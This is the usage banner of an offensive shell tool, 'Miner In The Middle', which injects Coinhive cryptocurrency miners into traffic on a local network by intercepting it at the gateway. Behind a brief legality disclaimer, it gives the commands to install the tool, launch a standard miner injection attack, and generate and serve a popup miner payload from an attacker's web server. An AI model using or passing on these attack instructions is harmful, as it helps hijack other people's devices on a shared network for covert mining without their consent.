
		
	 Miner In The Middle
	 Author - Anthony Russell
	 @DotNetRussell

	 Not for illegal use!
	 (unless you own the network or have permission from everyone on it, it's illegal)
	 
	 To install dependencies run:
	 	./miner_itm.sh --install
	
	 To launch a standard miner injection attack run:
	 	./miner_itm.sh <coinhive api key> <gateway ip> <interface name>
	
	 ----To launch a popup miner attack----
	
	 	First run:
	 		./miner_itm.sh --generate <coinhive api key>
	
	 and place payload.html into your web server root directory
	
   	Second run:
			./miner_itm.sh -p <gateway ip> <interface name> <web server ip>
	
	

